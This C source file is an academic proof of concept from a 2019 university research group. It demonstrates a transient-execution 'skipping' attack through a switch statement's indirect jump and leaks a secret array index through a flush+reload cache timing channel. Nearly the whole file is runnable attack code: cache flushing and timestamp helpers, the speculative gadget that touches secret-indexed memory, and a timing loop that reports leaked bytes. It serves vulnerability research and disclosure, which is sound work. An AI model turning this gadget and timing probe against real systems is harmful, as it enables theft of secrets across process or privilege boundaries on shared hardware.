/*******************************************************************************
  Transient execution attack PoC using the "Skipping" mechanism - indirect jump

This source code (PoC-switch.c) shows a Proof-of-Concept (PoC) example to 
demonstrate the "Skipping" mechanism transient attacks using an indirect jump.

In this example, case 0 and case 2 in the switch statement can access user_dat 
with either secret value (in case 0), or nonsecret value (in case 2).  Since 
case selector sw is fixed to point to case 2. The execution of switch statement 
should always take place at nowhere but case 2 and accesses user_data with non 
secret value as  user_dat[position_nonsecret*256].  However, during resolving 
the indirect jump inside of the switch statement, "skipping" mechanism advances 
the transient execution to the instructions located right after the indirect 
jump.

As a result, user_dat[position_secret*256] is cached, and the secret could be 
observable via cache covert channel via timing analysis. Please note, 
#define CACHE_HIT_THRESHOLD 100 is hardcoded for our machine, other machines 
may require other cache hit threshold.

Contact:
    Dmitry Devtyushkin:   devtyushkin@wm.edu
    Tao Zhang:    tzhang06@email.wm.edu

July 2019, College of William & Mary
*******************************************************************************/




#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <x86intrin.h> /*potential Intrinsics on other platforms for rdtsc, rdtscp, clflush */

typedef unsigned long long u64;

#define PAGE_SIZE 4096
#define PAGE_ADDR(X) ((uint64_t)X &~ 0xfff)
#define CACHE_HIT_THRESHOLD 100 // 100 as a suitable threshold in Intel(R) Core(TM) i7-4800MQ
#define CACHE_FLUSH_ITERATIONS 2048
#define CACHE_FLUSH_STRIDE 4096


__attribute__((always_inline)) inline void clflush(volatile void *p){
  asm volatile ("clflush (%0)" :: "r"(p));
  return;
}

__attribute__((always_inline)) inline uint64_t rdtscp(){
  unsigned int lo,hi;
  __asm__ __volatile__ ("rdtscp" : "=a" (lo), "=d" (hi));
  return ((uint64_t)hi << 32) | lo;
}

void timing_analysis();

uint8_t uninteresting_data_0 [CACHE_FLUSH_ITERATIONS*CACHE_FLUSH_STRIDE]; // unrelated data placed to seperate data of interest

int position_secret = 42; // secret

uint64_t uninteresting_data_1 [4096*1] = {[0 ... 4095] = 9999}; // unrelated data placed to seperate data of interest

int position_nonsecret = 237; // nonsecret 


uint64_t uninteresting_data_2 [4096*1] = {[0 ... 4095] = 9999}; // unrelated data placed to seperate data of interest

int user_dat [256*256] = {[0 ... 65279] = 7}; // user data

uint64_t uninteresting_data_3 [4096*1] = {[0 ... 4095] = 9999}; // unrelated data placed to seperate data of interest

unsigned n_run = 1;
int n_success = 0;
int n_error = 0;
int n_measurements = 0;
int n_normal = 0;
int var = 0;


int main(int argc, char ** argv) {
  if(argc != 2){
    printf("Usage: ./PoC-switch [# of true attack] (e.g. 1, 10, 100, etc.) \n");
    exit(1);
  }

  unsigned num_probe = atoi(argv[1]);
  int sw = 2;  // case selection is fixed to case 2

  // Flush the entire data cache (from Spectre PoC).
  int unrelated;
  for (int i = 0; i < (uint8_t)sizeof(uninteresting_data_0); i++) uninteresting_data_0[i] = 1;
  for(int l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) unrelated = uninteresting_data_0[l];

  
  printf(" --------------------Test Start-------------------- \n");
  printf("[sub-tests # ] cached_dat[position] = accessing time\n");

  int position;

  // allow repetitive tests
  while(1){
    /********************************************************************
                            Attack Code
    ********************************************************************/
    switch(sw){  // the switch statement the here contains a indirect jump to different cases.
        case 0: // since sw = 2, this case should be never executed
            asm("nop; nop;"); // nop acts as other code
            position = position_secret; // assigns a index variable with a secret value.
            var = user_dat[position * 256];
            break;
        case 1:
            asm("nop; nop; nop;");             
            break;
        case 2: // correct case to execute
            asm("nop; nop; nop; nop;");
            position = position_nonsecret; // assigns a index variable with a nonsecret value.
            var = user_dat[position * 256];
            break;
        case 3:
            asm("nop; nop; nop; nop; nop;");
            break;
        case 4:
            asm("nop; nop; nop; nop; nop; nop;");
            break;
        case 5:
            asm("nop; nop; nop; nop; nop; nop; nop;");
            break;
        default:
            asm("nop; nop; nop; nop; nop; nop; nop; nop;");
            break;
    }

    // timing analysis to retrieve the secret
    timing_analysis();
    if (n_success == num_probe) break;

    usleep(10);
  }

  printf(" --------------------result-------------------- \n");
  printf("%d bytes were leaked in %d attempts.\n", 
    n_success, n_run - 1);
  printf("%d cache hits: %d violated arch. states; %d non-violated arch. states.\
    \nError rate: %f%%\n", 
    n_measurements, n_success, n_normal, ((float) n_error /(n_success+n_error))*100);
  
  return 0;
}  


/********************************************************************
                          Timing Analysis
********************************************************************/
void timing_analysis(){
  uint64_t t1,t2;
  uint64_t arr_timing[256];
  char z;
  int rand_i;
  for(int i=0; i<256; i++){
    rand_i = ((i * 167) + 13) & 255; // accessing every entry in random fashion
    t1 = rdtscp();
    z = user_dat[rand_i * 256];
    t2 = rdtscp();
    arr_timing[rand_i] = t2 - t1;
  }

  // flush CPU cache
  for(int i=0; i<256; i++){
    clflush(&user_dat[i * 256]);
  }

  printf("[sub-tests #%d] ",n_run++);

  for(int i=0; i<256; i++){
    if(arr_timing[i] < CACHE_HIT_THRESHOLD) {
      n_measurements++;
      printf("user_dat[%d] = %lu; ", i, arr_timing[i]);
      if (i == 42) n_success++;
      if (i == 237) n_normal++;
      if (i != 42 && i != 237) n_error++;
    }
  }
  printf("\n");
  
  return;
}
